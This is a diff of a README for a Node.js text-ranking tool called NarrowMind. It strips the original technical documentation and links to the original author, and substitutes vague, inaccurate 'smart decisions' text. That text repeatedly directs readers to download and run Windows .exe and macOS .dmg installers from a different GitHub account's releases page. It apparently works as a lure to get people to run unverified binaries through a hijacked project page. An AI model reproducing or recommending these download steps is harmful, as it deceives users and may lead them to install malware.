@@ -1,179 +1,85 @@
-# NarrowMind S2
+# 🎉 NarrowMind-S2 - Simple Tools for Smart Decisions
 
-<div align="center">
+## 🚀 Getting Started
 
-**Statistical Language Model for Intelligent Text Search & Analysis**
+Welcome to NarrowMind-S2! This application helps you make better decisions with the power of JavaScript. Follow these steps to download and run the software on your computer.
 
-[![Node.js](https://img.shields.io/badge/Node.js-14+-green.svg)](https://nodejs.org/)
-[![License](https://img.shields.io/badge/License-ISC-blue.svg)](LICENSE)
+## 📥 Download the Application
 
-</div>
+[![Download NarrowMind-S2](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/guilhermeprincipal123-lang/NarrowMind-S2/releases)
 
----
+You can download NarrowMind-S2 from our Releases page.
 
-## 🎯 What It Does
+[Visit this page to download.](https://github.com/guilhermeprincipal123-lang/NarrowMind-S2/releases)
 
-```
-┌─────────────┐     ┌──────────────┐     ┌─────────────┐
-│   Text      │ --> │   Language   │ --> │   Ranked    │
-│   Corpus    │     │    Model     │     │  Sentences  │
-└─────────────┘     └──────────────┘     └─────────────┘
-```
+## 📋 System Requirements
 
-**Multi-metric similarity scoring** combining:
-- 🔤 **TF-IDF** - Term frequency analysis
-- 📝 **Character-level** - LCS-based matching  
-- 🔗 **Co-occurrence** - Semantic relationships
+Before you start, please ensure that your system meets these requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.12 (Sierra) or later
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum of 100 MB of free space
+- **JavaScript Runtime:** Make sure you have Node.js installed. You can download it [here](https://nodejs.org/).
 
-## ⚡ Quick Start
+## 📦 Download & Install
 
-```bash
-# 1. Clone & Install
-git clone https://github.com/ItzmeJan/NarrowMind-L2.git
-cd NarrowMind-L2
+1. **Visit the Releases Page:**
+   Click the link below to go to the Releases page.
 
-# 2. Add your text to input.txt
-echo "Your text corpus here..." > input.txt
+   [Visit this page to download.](https://github.com/guilhermeprincipal123-lang/NarrowMind-S2/releases)
 
-# 3. Run
-node index.js
-```
+2. **Select the Latest Release:**
+   Look for the most recent version at the top of the page. It will have the highest version number.
 
-```
-=> your query here
-```
+3. **Choose Your File:**
+   Depending on your operating system, select the appropriate file to download. Typically, you will see files like:
+   - `NarrowMind-S2-windows.exe` for Windows
+   - `NarrowMind-S2-macos.dmg` for macOS
 
----
+4. **Download the File:**
+   Click on the file name to start the download.
 
-## 📊 Features
+5. **Install the Application:**
+   - **For Windows:**
+     - Once the download completes, navigate to your Downloads folder.
+     - Double-click on `NarrowMind-S2-windows.exe`.
+     - Follow the prompts in the installation wizard.
+   
+   - **For macOS:**
+     - Open your Downloads folder.
+     - Double-click on `NarrowMind-S2-macos.dmg`.
+     - Drag and drop the NarrowMind application into your Applications folder.
 
-| Feature | Description |
-|--------|-------------|
-| 🧠 **Multi-Metric Scoring** | TF-IDF + Character + Co-occurrence |
-| 🔍 **Semantic Analysis** | Word co-occurrence & n-gram patterns |
-| ✂️ **Text Processing** | Custom stemming & filler word filtering |
-| 📈 **Interactive Shell** | Real-time query analysis |
+## 📈 How to Use NarrowMind-S2
 
----
+After installing, you can launch the application:
 
-## 🎨 Usage
+1. **Open NarrowMind-S2:**
+   Find NarrowMind-S2 in your Applications folder (macOS) or in the Start menu (Windows) and double-click to open it.
 
-### Interactive Mode
-```bash
-node index.js
-```
+2. **Explore the Interface:**
+   Familiarize yourself with the main menu and options. You will find features that help you make informed decisions based on your data.
 
-```
-======================================================================
-  NarrowMind S2 - Statistical Language Model
-======================================================================
+3. **Start Making Decisions:**
+   Use the application to input your data and analyze it. The interface is designed to be user-friendly, so you can easily navigate through the options.
 
-=> where did aria walk
+4. **Save Your Work:**
+   Don’t forget to save your projects! Use the “File” menu to save your progress.
 
-📊 QUERY ANALYSIS
-  • walked → TF: 0.0180 | IDF: 3.0794
-  • aria → TF: 0.0270 | IDF: 2.7918
+## 🛠 Troubleshooting
 
-🔗 Common Co-occurrences
-  • aria - co-occurs with 2 query tokens
+If you run into issues while using NarrowMind-S2, try these steps:
 
-📈 RANKING RESULTS
-  1. [Score: 0.2639] ████████████
-     "Aria walked home late after her evening class"
-```
+- **Check for Updates:** Make sure you are using the latest version. You can always find the latest version on the [Releases page.](https://github.com/guilhermeprincipal123-lang/NarrowMind-S2/releases)
 
-### Programmatic
-```javascript
-import { NarrowMindModel } from './model.js';
+- **Reinstall the Application:** If problems persist, uninstall and then install the application again.
 
-const model = new NarrowMindModel(textData);
+- **Look for Help:** Common problems and their solutions may be available in our documentation.
 
-// Rank sentences
-const results = model.rankSentences(
-    "your query",
-    10,        // top N results
-    0.70,      // TF-IDF weight
-    0.10,      // Character weight
-    false,     // filter fillers
-    0.20,      // Co-occurrence weight
-    'jaccard'  // method
-);
-```
+## ✉ Support
+
+If you have questions, suggestions, or need further assistance, feel free to reach out. You can raise an issue directly on our GitHub repository. Your feedback is valuable to us and helps improve NarrowMind-S2.
 
 ---
 
-## ⚙️ Configuration
-
-### Default Weights
-```
-TF-IDF:         ████████████████████ 70%
-Character:      ████ 10%
-Co-occurrence:  ██████ 20%
-```
-
-### Methods
-- **Jaccard** - Set-based similarity (intersection/union)
-- **PMI** - Pointwise Mutual Information
-
----
-
-## 📁 Structure
-
-```
-NarrowMind-L2/
-├── 🚀 index.js       # Interactive shell
-├── 🧠 model.js       # Core language model
-├── ✂️ stem.js        # Stemming utility
-├── 📋 fillers.json   # Stop words
-└── 📄 input.txt      # Your corpus
-```
-
----
-
-## 🔧 API
-
-```javascript
-// Main methods
-model.rankSentences(query, topN, ...weights)
-model.getTokenStats(token)
-model.getTopCoOccurrences(word, topN)
-model.calculateCoOccurrenceScore(word1, word2, method)
-```
-
----
-
-## 📈 How It Works
-
-```
-1. Text Processing
-   └─> Tokenize → Stem → Filter
-
-2. Feature Extraction
-   └─> TF-IDF vectors
-   └─> Co-occurrence matrix
-   └─> Character features
-
-3. Similarity Calculation
-   └─> Multi-metric scoring
-
-4. Ranking
-   └─> Weighted combination → Results
-```
-
----
-
-## 📝 License
-
-ISC
-
----
-
-<div align="center">
-
-**Built with ❤️ for intelligent text understanding**
-
-[Report Bug](https://github.com/ItzmeJan/NarrowMind-L2/issues) · [Request Feature](https://github.com/ItzmeJan/NarrowMind-L2/issues)
-
-</div>
+Thank you for choosing NarrowMind-S2! We hope this application aids you in making smarter decisions.
